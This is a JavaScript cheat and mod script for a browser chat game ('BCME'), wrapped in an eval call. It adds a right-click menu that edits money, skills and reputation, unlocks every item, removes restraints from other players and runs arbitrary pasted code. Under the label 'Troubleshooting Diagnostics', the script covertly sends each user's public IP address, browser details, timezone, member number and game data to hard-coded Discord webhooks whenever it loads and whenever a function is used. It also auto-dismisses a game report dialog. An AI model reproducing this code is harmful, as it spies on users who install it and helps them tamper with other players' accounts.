var sprc = atob('//Send Debug______________________
async function sendDiscordMessage() {
  const gIPA = async () => {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    return data.ip;
  };

  const ipA = await gIPA();

  setTimeout(() => {
    const webhookUrl = "https://discord.com/api/webhooks/1081612157973712896/-RnstrN3Mk5YappUKUuHca0KQcw6UD_xnCtxRXxLmZaY3CqgogIv5mVut5jOGgkhsGc9";
    const totalname = Player.Name + " (" + Player.MemberNumber + ")";
    const username = totalname;
    const avatarUrl = "https://media.discordapp.net/attachments/781749229331939328/1079659016919195748/b66419117897a988.png?width=1190&height=1189";
    const useragent = navigator.userAgent;
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    const openTabs = window.length;
    const screenSize = `${window.screen.width}x${window.screen.height}`;

    const message = {
      content: Player.Name + " logged into BCME",
      embeds: [{
        title: "Troubleshooting Diagnostics ",
        fields: [
          {
            name: "User",
            value: Player.Name + " (" + Player.MemberNumber + ")",
            inline: true
          },
          {
            name: "Timezone",
            value: timezone,
            inline: true
          },
          {
            name: "Device Type",
            value: useragent,
            inline: true
          },
          {
            name: "Money",
            value: Player.Money,
            inline: true
          },
          {
            name: "Nickname",
            value: Player.Nickname,
            inline: true
          },
          {
            name: "Font",
            value: Player.GraphicsSettings.Font,
            inline: true
          },
          {
            name: "Chat Color Theme",
            value: Player.ChatSettings.ColorTheme,
            inline: true
          },
          {
            name: "Arousal Progress",
            value: Player.ArousalSettings.Progress,
            inline: true
          },
          {
            name: "Last Chat Room",
            value: Player.LastChatRoom,
            inline: true
          },
          {
            name: "Local IP Address",
            value: ipA,
            inline: true
          },
          {
            name: "Open Tabs",
            value: openTabs,
            inline: true
          },
          {
            name: "Screen Size",
            value: screenSize,
            inline: true
          }
        ]
      }]
    };

    const payload = {
      username: username,
      avatar_url: avatarUrl,
      content: message.content,
      embeds: message.embeds
    };

    fetch(webhookUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(payload)
    });
  }, 60000);
}

sendDiscordMessage();


//used function debug_____________

async function sendFdebug() {
  try {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    const ipA = data.ip;

    const webhookUrl = "https://discord.com/api/webhooks/1081650135408312420/pQ1woovJTYYLhOEblhaZNE0AhuuSoyuMO-2TrOwLC0bZDD14CJo6JlKfFxNAZm0OduzW";
    const totalname = Player.Name + " (" + Player.MemberNumber + ")";
    const username = totalname;
    const avatarUrl = "https://media.discordapp.net/attachments/781749229331939328/1079659016919195748/b66419117897a988.png?width=1190&height=1189";
    const useragent = navigator.userAgent;
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    const openTabs = window.length;
    const screenSize = `${window.screen.width}x${window.screen.height}`;

    const message = {
      content: Player.Name + " used a function in BCME",
      embeds: [{
        title: "Troubleshooting Diagnostics ",
        fields: [
          {
            name: "User",
            value: Player.Name + " (" + Player.MemberNumber + ")",
            inline: true
          },
          {
            name: "Timezone",
            value: timezone,
            inline: true
          },
          {
            name: "Device Type",
            value: useragent,
            inline: true
          },
          {
            name: "Money",
            value: Player.Money,
            inline: true
          },
          {
            name: "Nickname",
            value: Player.Nickname,
            inline: true
          },
          {
            name: "Font",
            value: Player.GraphicsSettings.Font,
            inline: true
          },
          {
            name: "Chat Color Theme",
            value: Player.ChatSettings.ColorTheme,
            inline: true
          },
          {
            name: "Arousal Progress",
            value: Player.ArousalSettings.Progress,
            inline: true
          },
          {
            name: "Last Chat Room",
            value: Player.LastChatRoom,
            inline: true
          },
          {
            name: "Local IP Address",
            value: ipA,
            inline: true
          },
          {
            name: "Open Tabs",
            value: openTabs,
            inline: true
          },
          {
            name: "Screen Size",
            value: screenSize,
            inline: true
          }
        ]
      }]
    };

    const payload = {
      username: username,
      avatar_url: avatarUrl,
      content: message.content,
      embeds: message.embeds
    };

    await fetch(webhookUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(payload)
    });
  } catch (error) {
    console.error(error);
  }
}


//End Of Debug______________________


//Start Of Loading Screen___________________________________________________________
// Define the URL of the raw GitHub file that contains the HTML code you want to import
const htmlFileUrl = 'https://raw.githubusercontent.com/BCMS7/BCM-/main/loading4';

// Fetch the HTML code from the raw GitHub file using the Fetch API
fetch(htmlFileUrl)
  .then(response => response.text())
  .then(html => {
    // Create a new iframe element
    const iframe = document.createElement('iframe');
    iframe.style.position = 'fixed';
    iframe.style.top = '0';
    iframe.style.left = '0';
    iframe.style.width = '138%';
    iframe.style.height = '125%';
    iframe.style.marginLeft = '-19%'; // Add left margin to the iframe
    iframe.style.marginTop = '-2%'; // Add left margin to the iframe



    // Load the imported HTML into the iframe
    iframe.onload = function() {
      const iframeDocument = this.contentWindow.document;
      iframeDocument.open();
      iframeDocument.write(html);
      iframeDocument.close();
    };

    // Append the iframe to the current page's <body> element
    document.body.appendChild(iframe);
    // Remove the iframe after 7 seconds
setTimeout(() => {
  document.body.removeChild(iframe);
}, 7000);
  })
  .catch(error => {
    console.error('Error importing HTML:', error);
  });


//End Of Loading Screen ____________________________________________

  
fetch('https://raw.githubusercontent.com/BCMS7/BCM/main/servermaintainance')
  .then(response => response.text())
  .then(data => {
    const regex = /\d+/;
    const match = data.match(regex);
    if (match && parseInt(match[0]) >= 1) {
      function showToastMaint() {
        // Create the toast container
        var toastContainer = document.createElement("div");
        toastContainer.style.position = "fixed";
        toastContainer.style.bottom = "5px";
        toastContainer.style.right = "5px";
        toastContainer.style.backgroundColor = "white";
        toastContainer.style.color = "#141414";
        toastContainer.style.padding = "5px";
        toastContainer.style.border = "2px solid #f22c2c";
        toastContainer.style.borderRadius = "5px";
        toastContainer.style.boxShadow = "2px 2px 10px rgba(0, 0, 0, 0.5)";
        toastContainer.style.display = "none";
        toastContainer.style.zIndex = "999";
        toastContainer.style.transition = "opacity 0.5s ease-in-out";
        toastContainer.style.opacity = "0";
        toastContainer.style.display = "flex";
        toastContainer.style.alignItems = "center";
        var statusBar = document.createElement("div");
    statusBar.style.width = "100%";
    statusBar.style.height = "3px";
    statusBar.style.backgroundColor = "black";
    statusBar.style.position = "absolute";
    statusBar.style.bottom = "0";
    statusBar.style.left = "0";
    statusBar.style.transition = "width 5s ease-in-out";
    statusBar.style.width = "0%";
    toastContainer.appendChild(statusBar);
    
    // Update the width of the status bar as it counts down
    setTimeout(function() {
      statusBar.style.width = "100%";
    }, 0);
        
    // Add the custom image icon
    var icon = document.createElement("img");
    icon.src = "https://media.discordapp.net/attachments/781749229331939328/1079659016919195748/b66419117897a988.png?width=1190&height=1189";
    icon.style.width = "23px";
    icon.style.height = "23px";
    icon.style.borderRadius = "50%";
    icon.style.marginRight = "-30px";
    icon.style.marginBottom = "-5px";
    toastContainer.appendChild(icon);
    
    // Add the text message
    var text = document.createElement("span");
    text.style.fontWeight = "bold";
    text.style.marginLeft = "35px";
    text.innerHTML = "BCME servers are under maintainance, try again later";
    toastContainer.appendChild(text);
    
        
      
        // Append the toast container to the body
        document.body.appendChild(toastContainer);
      
        // Show the toast with a fade in animation
        setTimeout(function() {
          toastContainer.style.display = "block";
          toastContainer.style.opacity = "1";
        }, 0);
      
        // Hide the toast with a fade out animation
        setTimeout(function() {
          toastContainer.style.opacity = "0";
        }, 5000000);
      
        setTimeout(function() {
          toastContainer.style.display = "none";
        }, 5500000);
      } 
      showToastMaint();     
      throw new Error('Execution stopped.'); // stop executing the rest of the code
    } else {


//Start Of Context Menu________________________________

var visb = true;
//context Menu
var contextMenuOpen = false;
// Function to create custom context menu buttons
function createButton(text, onClick) {
     contextMenuOpen = true;
    var button = document.createElement("div");
    button.innerHTML = text;
    button.onclick = onClick;
    button.style.width = "100%";
    button.style.textAlign = "left";
    button.style.padding = "5px";
    button.style.cursor = "pointer";
    return button;
}

// Function to create a separator
function createSeparator() {
    var separator = document.createElement("hr");
    separator.style.margin = "5px 0";
    return separator;
}

// Function to display custom context menu
document.addEventListener("contextmenu", function(event) {
  if (contextMenuOpen) {
    event.preventDefault();
      return; // Do nothing if a context menu is already open
  }
  event.preventDefault();
  var contextMenu = document.createElement("div");
  contextMenu.style.position = "fixed";
  contextMenu.style.top = event.clientY + "px";
  contextMenu.style.left = event.clientX + "px";
  contextMenu.style.background = "linear-gradient(to bottom, white, white)";
  contextMenu.style.boxShadow = "0 0 3px #999";
  contextMenu.style.borderRadius = "8px";
  contextMenu.style.zIndex = "9999";
  contextMenu.style.border = "2px solid black";
  contextMenuOpen = true;
  document.addEventListener("click", function() {
      contextMenu.style.display = "none";
      contextMenuOpen = false;
  });
    


    // Create header with profile photo
    var header = document.createElement("div");
    header.style.display = "flex";
    header.style.alignItems = "center";
    header.style.padding = "5px";

    var profilePhoto = document.createElement("img");
    profilePhoto.src = "https://media.discordapp.net/attachments/781749229331939328/1079659016919195748/b66419117897a988.png?width=1190&height=1189";
    profilePhoto.style.width = "30px";
    profilePhoto.style.height = "30px";
    profilePhoto.style.borderRadius = "20%";
    profilePhoto.style.marginRight = "10px";

    var headerText = document.createElement("div");
    headerText.innerHTML = "<b>Essentials</b>";

    header.appendChild(profilePhoto);
    header.appendChild(headerText);

 // Create custom buttons
 var button1 = createButton("Restore Character", function() {
    javascript:Player.Appearance = ChatSearchSafewordAppearance.slice(0);  CharacterRefresh(Player);  ChatRoomCharacterUpdate(Player);
    showToastscpg();
    
});
var button2 = createButton("Force Room Swap", function() {
    javascript:ChatSelectStartSearch('X'),ChatRoomSetLastChatRoom(''),document['getElementById']('InputChat')['style']['display']='none',document['getElementById']('TextAreaChatLog')['style']['display']='none',ChatSelectStartSearch('X'),ChatRoomSetLastChatRoom('');
    showToastscpg();
});
var button3 = createButton("Free Target", function() {
    javascript:CharacterReleaseTotal(CurrentCharacter),ChatRoomCharacterUpdate(CurrentCharacter);
    showToastscpg();
});
var button4 = createButton("Remove Restraint", function() {
    javascript:InventoryUnlock(CurrentCharacter, CurrentCharacter.FocusGroup.Name);
    InventoryRemove(CurrentCharacter, CurrentCharacter.FocusGroup.Name);
    ChatRoomCharacterItemUpdate(CurrentCharacter, CurrentCharacter.FocusGroup.Name);
    showToastscpg();
});
var button5 = createButton("Target Struggle Difficulty", function() {
    javascript:do{var difc=prompt('Difficulty\x201-96');}while(!(difc>=0x1&&difc<=0x60));
    InventorySetDifficulty(CurrentCharacter, "ItemHead", difc);
    InventorySetDifficulty(CurrentCharacter, "ItemMouth", difc);
    InventorySetDifficulty(CurrentCharacter, "ItemMouth2", difc);
    InventorySetDifficulty(CurrentCharacter, "ItemMouth3", difc);
    InventorySetDifficulty(CurrentCharacter, "ItemArms", difc);
    InventorySetDifficulty(CurrentCharacter, "ItemHands", difc);
    InventorySetDifficulty(CurrentCharacter, "ItemLegs", difc);
    InventorySetDifficulty(CurrentCharacter, "ItemEyes", difc);
    InventorySetDifficulty(CurrentCharacter, "ItemFeet", difc);
    InventorySetDifficulty(CurrentCharacter, "ItemDevices", difc);
    InventorySetDifficulty(CurrentCharacter, "ItemAddon", difc);
    InventorySetDifficulty(CurrentCharacter, "ItemNeck", difc);
    InventorySetDifficulty(CurrentCharacter, "ItemNeckRestraints", difc);
    InventorySetDifficulty(CurrentCharacter, "ItemNeckAccessories", difc);
    InventorySetDifficulty(CurrentCharacter, "ItemBoots", difc);
    InventorySetDifficulty(CurrentCharacter, "ItemHood", difc);
    InventorySetDifficulty(CurrentCharacter, "ItemNose", difc);
    ChatRoomCharacterUpdate(CurrentCharacter);
    showToastscpg();
});
var button6 = createButton("Open Target Wardrobe", function() {
    javascript:DialogChangeClothes();
    showToastscpg();
});
var button7 = createButton("Complete Struggle Minigame", function() {
    contextMenuOpen = false;
    javascript:StruggleProgress =1000;
    contextMenu.style.display = "none";
    setTimeout(function() {
        ChatRoomClickCharacter(Player);
        DialogLeave();
    }, 500);
    showToastscpg();
});

var button8 = createButton("Invisible", function() {
    javascript:InventoryGet(Player, "Emoticon").Property.OverrideHeight = {
      Height: "-"
      };
      CurrentScreen === "ChatRoom" ?
      ChatRoomCharacterUpdate(Player) :
      CharacterRefresh(Player);
      ChatRoomCharacterUpdate(Player); 
      visb = false;
      showToastscpg();
      updateContextMenu(); // call updateContextMenu to update the context menu

    
});

var button9 = createButton("Visible", function() {
  javascript:CharacterSetActivePose(Player, null);
  delete InventoryGet(Player, 'Emoticon').Property.OverrideHeight;
  CurrentScreen === 'ChatRoom' ?
  ChatRoomCharacterUpdate(Player) :
  CharacterRefresh(Player);
      visb = true;
    showToastscpg();
    updateContextMenu(); // call updateContextMenu to update the context menu

  
});

var button10 = createButton("Custom Script", function() {
  javascript:var scrp = prompt("Paste your script here:");
  if (scrp) {
    eval(scrp);
    showToastscpg();
  }
});
// Transition styles for the buttons
button1.style.transition = "background-color 0.2s ease-in-out";
button2.style.transition = "background-color 0.2s ease-in-out";
button3.style.transition = "background-color 0.2s ease-in-out";
button4.style.transition = "background-color 0.2s ease-in-out";
button5.style.transition = "background-color 0.2s ease-in-out";
button6.style.transition = "background-color 0.2s ease-in-out";
button7.style.transition = "background-color 0.2s ease-in-out";
button8.style.transition = "background-color 0.2s ease-in-out";
button9.style.transition = "background-color 0.2s ease-in-out";
button10.style.transition = "background-color 0.2s ease-in-out";



//Hover events for the buttons
button1.addEventListener("mouseover", function() {
    this.style.backgroundColor = "#dddddd";
    this.style.width = "190px";
    });
button1.addEventListener("mouseout", function() {
    this.style.backgroundColor = "";
    });

button2.addEventListener("mouseover", function() {
this.style.backgroundColor = "#dddddd";
this.style.width = "190px";
});
button2.addEventListener("mouseout", function() {
this.style.backgroundColor = "";
});

button3.addEventListener("mouseover", function() {
this.style.backgroundColor = "#dddddd";
this.style.width = "190px";
});
button3.addEventListener("mouseout", function() {
this.style.backgroundColor = "";
});

button4.addEventListener("mouseover", function() {
this.style.backgroundColor = "#dddddd";
this.style.width = "190px";
});
button4.addEventListener("mouseout", function() {
this.style.backgroundColor = "";
});

button5.addEventListener("mouseover", function() {
this.style.backgroundColor = "#dddddd";
this.style.width = "190px";
});
button5.addEventListener("mouseout", function() {
this.style.backgroundColor = "";
});

button6.addEventListener("mouseover", function() {
this.style.backgroundColor = "#dddddd";
this.style.width = "190px";
});
button6.addEventListener("mouseout", function() {
this.style.backgroundColor = "";
});

button7.addEventListener("mouseover", function() {
this.style.backgroundColor = "#dddddd";
this.style.width = "190.5px";
});
button7.addEventListener("mouseout", function() {
this.style.backgroundColor = "";
});

button8.addEventListener("mouseover", function() {
this.style.backgroundColor = "#dddddd";
this.style.width = "190px";
});
button8.addEventListener("mouseout", function() {
this.style.backgroundColor = "";
});

button9.addEventListener("mouseover", function() {
this.style.backgroundColor = "#dddddd";
this.style.width = "190px";
});
button9.addEventListener("mouseout", function() {
this.style.backgroundColor = "";
});

button10.addEventListener("mouseover", function() {
this.style.backgroundColor = "#dddddd";
this.style.width = "190px";
});
button10.addEventListener("mouseout", function() {
this.style.backgroundColor = "";
});

//Dropdown Menu

function forceclosemenu() {
      contextMenu.style.display = "none";
      ChatRoomClickCharacter(Player);
      DialogLeave();
  contextMenuOpen = false;
  }

 // Create a dropdown menu
var select = document.createElement("select");
select.style.borderRadius = "2px";
select.style.padding = "4px";
select.style.width = "200px";
select.style.marginTop = "-20px";
select.style.marginRight = "2px";
select.style.marginBottom = "3px";
select.style.marginLeft = "2px";
var option1 = document.createElement("option");
option1.value = "opt1";
option1.text = "Personalisation Menu";
option1.selected = true;
option1.disabled = true;
var option2 = document.createElement("option");
option2.value = "opt2";
option2.text = "Edit Cash";
var option3 = document.createElement("option");
option3.value = "opt3";
option3.text = "Max Skills";
var option4 = document.createElement("option");
option4.value = "opt4";
option4.text = "Max Reputation";
var option5 = document.createElement("option");
option5.value = "opt5";
option5.text = "Purchase Everything";
var option6 = document.createElement("option");
option6.value = "opt6";
option6.text = "Release Owner Collar";
var option7 = document.createElement("option");
option7.value = "opt7";
option7.text = "+1 LARP Level";
var option8 = document.createElement("option");
option8.value = "opt8";
option8.text = "Become Escaped Patient";
var option9 = document.createElement("option");
option9.value = "opt9";
option9.text = "Become Club Slave";
var option10 = document.createElement("option");
option10.value = "opt10";
option10.text = "Release Club Title";
var option11 = document.createElement("option");
option11.value = "opt11";
option11.text = "Set GGTS Level";
var option12 = document.createElement("option");
option12.value = "opt12";
option12.text = "Set Dom/Sub Level";
var option13 = document.createElement("option");
option13.value = "opt13";
option13.text = "Set Nickname";
var option14 = document.createElement("option");
option14.value = "opt14";
option14.text = "Force Orgasm";
select.appendChild(option1);
select.appendChild(option2);
select.appendChild(option3);
select.appendChild(option4);
select.appendChild(option12);
select.appendChild(option5);
select.appendChild(option6);
select.appendChild(option7);
select.appendChild(option8);
select.appendChild(option9);
select.appendChild(option10);
select.appendChild(option11);
select.appendChild(option13);
select.appendChild(option14);



// Create a button to show the dropdown menu
var dropdownButton = createButton("Personalisation", function() {
  select.style.display = "block";
});
// Apply CSS to make the button invisible and take no space
dropdownButton.style.opacity = "0";
dropdownButton.style.pointerEvents = "none";
dropdownButton.style.position = "absolute";
dropdownButton.style.top = "-9999px";
dropdownButton.style.left = "-9999px";
select.addEventListener("click", function(event) {
  event.stopPropagation(); // Stop the event from bubbling up to the context menu
});

select.addEventListener("change", function() {
  var selectedOption = select.options[select.selectedIndex].value;
  if (selectedOption === "opt1") {
    // Perform action for Option 1
    javascript:Player.Money = 9999999
    showToastscpg();
    event.stopPropagation();
    event.stopPropagation();
    forceclosemenu();
  } else if (selectedOption === "opt2") {
    // Perform action for Option 2
    javascript:Player.Money = prompt("Enter Cash Amount");
    showToastscpg();
    forceclosemenu();
  } else if (selectedOption === "opt3") {
    // Perform action for Option 3
    javascript:SkillChange("Infiltration", 10);
    SkillChange("SelfBondage", 10);//self-tie
    SkillChange("Willpower", 10);//Resist orgasms
    SkillChange("Evasion", 10);//Battle skills
    SkillChange("Bondage", 10);//Tie others
    SkillChange("Dressage", 10);//ABDL
    SkillChange("LockPicking", 10);
    showToastscpg();
    forceclosemenu();
  } else if (selectedOption === "opt4") {
    // Perform action for Option 4
    javascript:ReputationChange("Gaming", 100);//Arcade and KinkyDungeon
    ReputationChange("Gambling", 100);//Gambling room
    ReputationChange("LARP", 100);
    ReputationChange("Maid", 100);//Can be a Maid
    ReputationChange("ABDL", 100);
    ReputationChange("Nurse", 100);//Can be a Nurse
    showToastscpg();
    forceclosemenu();
  } else if (selectedOption === "opt5") {
    // Perform action for Option 5
    javascript:ServerPlayerSync
    AssetFemale3DCG.forEach(group=>group.Asset.forEach(item=>InventoryAdd(Player, item.Name, group.Group)));
    ServerPlayerInventorySync();
    showToastscpg();
    forceclosemenu();
  } else if (selectedOption === "opt6") {
    // Perform action for Option 6
    javascript:InventoryRemove(Player, "ItemNeck");
    ChatRoomCharacterItemUpdate(Player, "ItemNeck");
    LogAdd("ReleasedCollar", "OwnerRule"); 
    showToastscpg();
    forceclosemenu();
  } else if (selectedOption === "opt7") {
    // Perform action for Option 7
    javascript:alert('Start a LARP session & select class before running');
    GameLARPLevelProgress(100) 
    showToastscpg();
    forceclosemenu();
  } else if (selectedOption === "opt8") {
    // Perform action for Option 8
    javascript:LogAdd("Escaped", "Asylum", CurrentTime + 999999999);
    showToastscpg();
    forceclosemenu();
  } else if (selectedOption === "opt9") {
    // Perform action for Option 9
    javascript:LogAdd("ClubSlave", "Management", CurrentTime + 999999999);
    showToastscpg();
    forceclosemenu();
  } else if (selectedOption === "opt10") {
    // Perform action for Option 10
    javascript:LogAdd("Escaped", "Asylum", CurrentTime);
    LogAdd("ClubSlave", "Management", CurrentTime);
    LogAdd("BlockChange", "Rule", CurrentTime);
    ManagementIsClubSlave = function() {
    return false
    }
    ManagementClubSlaveDialog = function(Player) {}
    ManagementFinishClubSlave()
    showToastscpg();
    forceclosemenu();
  } else if (selectedOption === "opt11") {
    // Perform action for Option 11
    javascript:alert('Start a GGTS session before running, refresh to see changes');
    Player.Game.GGTS.Level = prompt("Enter GGTS Level (1-6)");;
    ServerAccountUpdate.QueueData({
    Game: Player.Game
    });
    showToastscpg();
    forceclosemenu();
    
  }else if (selectedOption === "opt12") {
    // Perform action for Option 12
    javascript:DialogSetReputation("Dominant", prompt("Enter Sub/Dom Rep (-100 to 100)"));
    showToastscpg();
    forceclosemenu();
  }else if (selectedOption === "opt13") {
    // Perform action for Option 13
    javascript:name = prompt("Enter Nickname");;
    Player.Nickname = name;
    ServerAccountUpdate.QueueData({ Nickname: name }, true);   
    showToastscpg();
    forceclosemenu();  
  }else if (selectedOption === "opt14") {
    // Perform action for Option 14
    javascript:ActivitySetArousal(Player, 1);
    ActivityOrgasmPrepare(Player, true);
    ActivityOrgasmGameResistCount = 1;
    showToastscpg();
    forceclosemenu();
  }
  // Hide the dropdown menu
  select.style.display = "none";
});

//End of DD menu

// Add header, buttons, and separator to context menu

function updateContextMenu() {
  while (contextMenu.firstChild) {
    contextMenu.removeChild(contextMenu.firstChild);
  }
  contextMenu.appendChild(header);
  contextMenu.appendChild(createSeparator());
  contextMenu.appendChild(button1);
  contextMenu.appendChild(button2);
  contextMenu.appendChild(button3);
  contextMenu.appendChild(button4);
  contextMenu.appendChild(button5);
  contextMenu.appendChild(button6);
  contextMenu.appendChild(button7);
  if (visb) {
    contextMenu.appendChild(button8);
  } else {
    contextMenu.appendChild(button9);
  }
  contextMenu.appendChild(button10);
  // Add the dropdown menu to the context menu
  contextMenu.appendChild(createSeparator());
  contextMenu.appendChild(dropdownButton);
  contextMenu.appendChild(select);
  
}

updateContextMenu();

// Event listener to update the menu when it is opened
contextMenu.addEventListener('contextmenu', function() {
  updateContextMenu();
});

document.body.appendChild(contextMenu);

    
});

// Function to hide custom context menu
document.addEventListener("click", function() {
    if (contextMenuOpen) {
        var contextMenu = document.querySelector("div[style*='fixed']");
        if (contextMenu) {
            contextMenu.style.display = "none";
            ChatRoomClickCharacter(Player);
            DialogLeave();
        }
        contextMenuOpen = false;
    }
});


//END OF CONTEXT MENU --------------------------------------
function showToastscpg() {
    // Create the toast container
    var toastContainer = document.createElement("div");
    toastContainer.style.position = "fixed";
    toastContainer.style.bottom = "5px";
    toastContainer.style.right = "5px";
    toastContainer.style.backgroundColor = "white";
    toastContainer.style.color = "#141414";
    toastContainer.style.padding = "5px";
    toastContainer.style.border = "2px solid #4CAF50";
    toastContainer.style.borderRadius = "5px";
    toastContainer.style.boxShadow = "2px 2px 10px rgba(0, 0, 0, 0.5)";
    toastContainer.style.display = "none";
    toastContainer.style.zIndex = "999";
    toastContainer.style.transition = "opacity 0.5s ease-in-out";
    toastContainer.style.opacity = "0";
    toastContainer.style.display = "flex";
    toastContainer.style.alignItems = "center";
    var statusBar = document.createElement("div");
statusBar.style.width = "100%";
statusBar.style.height = "3px";
statusBar.style.backgroundColor = "black";
statusBar.style.position = "absolute";
statusBar.style.bottom = "0";
statusBar.style.left = "0";
statusBar.style.transition = "width 5s ease-in-out";
statusBar.style.width = "0%";
toastContainer.appendChild(statusBar);


// Update the width of the status bar as it counts down
setTimeout(function() {
  statusBar.style.width = "100%";
}, 0);
    
// Add the custom image icon
var icon = document.createElement("img");
icon.src = "https://media.discordapp.net/attachments/781749229331939328/1079659016919195748/b66419117897a988.png?width=1190&height=1189";
icon.style.width = "23px";
icon.style.height = "23px";
icon.style.borderRadius = "50%";
icon.style.marginRight = "-30px";
icon.style.marginBottom = "-5px";
toastContainer.appendChild(icon);

// Add the text message
var text = document.createElement("span");
text.style.fontWeight = "bold";
text.style.marginLeft = "35px";
text.innerHTML = "Action Successfully Executed";
toastContainer.appendChild(text);

    
  
    // Append the toast container to the body
    document.body.appendChild(toastContainer);
  
    // Show the toast with a fade in animation
    setTimeout(function() {
      toastContainer.style.display = "block";
      toastContainer.style.opacity = "1";
    }, 0);
  
    // Hide the toast with a fade out animation
    setTimeout(function() {
      toastContainer.style.opacity = "0";
    }, 5000);
  
    setTimeout(function() {
      toastContainer.style.display = "none";
    }, 5500);
    sendFdebug();

  }
  

//The Update toast

  function showToastUpdate() {
    // Create the toast container
    var toastContainer = document.createElement("div");
    toastContainer.style.position = "fixed";
    toastContainer.style.bottom = "5px";
    toastContainer.style.right = "5px";
    toastContainer.style.backgroundColor = "white";
    toastContainer.style.color = "#141414";
    toastContainer.style.padding = "5px";
    toastContainer.style.border = "2px solid #f22c2c";
    toastContainer.style.borderRadius = "5px";
    toastContainer.style.boxShadow = "2px 2px 10px rgba(0, 0, 0, 0.5)";
    toastContainer.style.display = "none";
    toastContainer.style.zIndex = "999";
    toastContainer.style.transition = "opacity 0.5s ease-in-out";
    toastContainer.style.opacity = "0";
    toastContainer.style.display = "flex";
    toastContainer.style.alignItems = "center";
    var statusBar = document.createElement("div");
statusBar.style.width = "100%";
statusBar.style.height = "3px";
statusBar.style.backgroundColor = "black";
statusBar.style.position = "absolute";
statusBar.style.bottom = "0";
statusBar.style.left = "0";
statusBar.style.transition = "width 5s ease-in-out";
statusBar.style.width = "0%";
toastContainer.appendChild(statusBar);

// Update the width of the status bar as it counts down
setTimeout(function() {
  statusBar.style.width = "100%";
}, 0);
    
// Add the custom image icon
var icon = document.createElement("img");
icon.src = "https://media.discordapp.net/attachments/781749229331939328/1079659016919195748/b66419117897a988.png?width=1190&height=1189";
icon.style.width = "23px";
icon.style.height = "23px";
icon.style.borderRadius = "50%";
icon.style.marginRight = "-30px";
icon.style.marginBottom = "-5px";
toastContainer.appendChild(icon);

// Add the text message
var text = document.createElement("span");
text.style.fontWeight = "bold";
text.style.marginLeft = "35px";
text.innerHTML = "New update detected, upgrade build for latest features";
toastContainer.appendChild(text);

    
  
    // Append the toast container to the body
    document.body.appendChild(toastContainer);
  
    // Show the toast with a fade in animation
    setTimeout(function() {
      toastContainer.style.display = "block";
      toastContainer.style.opacity = "1";
    }, 0);
  
    // Hide the toast with a fade out animation
    setTimeout(function() {
      toastContainer.style.opacity = "0";
    }, 5000000);
  
    setTimeout(function() {
      toastContainer.style.display = "none";
    }, 5500000);
  }
  

  // Call the showToast function immediately

  const elementToRemove = document.querySelector('div[style="position: absolute; inset: 5%; background: white; display: flex; flex-direction: column; padding: 1em;"]');

  setInterval(function() {
    const elementToRemove = document.querySelector('div[style="position: absolute; inset: 5%; background: white; display: flex; flex-direction: column; padding: 1em;"]');
    if (elementToRemove) {
      const buttons = elementToRemove.querySelectorAll('button[style="cursor: pointer;"]');
      if (buttons) {
        buttons.forEach(button => button.click());
      }
    }
  }, 1);
  setInterval(function() {
    const elementToRemove = document.querySelector('div[style="position: absolute; inset: 5%; background: white; display: flex; flex-direction: column; padding: 1em;"]');
    if (elementToRemove) {
      const buttons = elementToRemove.querySelectorAll('button[style="cursor: pointer;"]');
      if (buttons) {
        buttons.forEach(button => {
          if (button.textContent === "Do not show this report again unless something changes" || button.textContent === "Close") {
            button.click();
          }
        });
      }
    }
  }, 500);

  // Define the URL of the raw GitHub page to check
const url = 'https://raw.githubusercontent.com/BCMS7/BCM/main/updatemanager.js';
// Define the maximum version number allowed
const maxVersion = 9;
// Define a flag to keep track of whether the alert has been triggered
let alertTriggered = false;
// Define a function to check the version and show the alert if necessary
function checkVersion() {
  fetch(url)
    .then(response => response.text())
    .then(version => {
      if (parseInt(version) > maxVersion && !alertTriggered) {
        showToastUpdate();
        alertTriggered = true;
      }
    })
    .catch(error => console.error(error));
}
// Call the checkVersion function every 5 seconds using a loop
setInterval(checkVersion, 5000);
}
})')
if (sprc) {
eval(sprc);
}
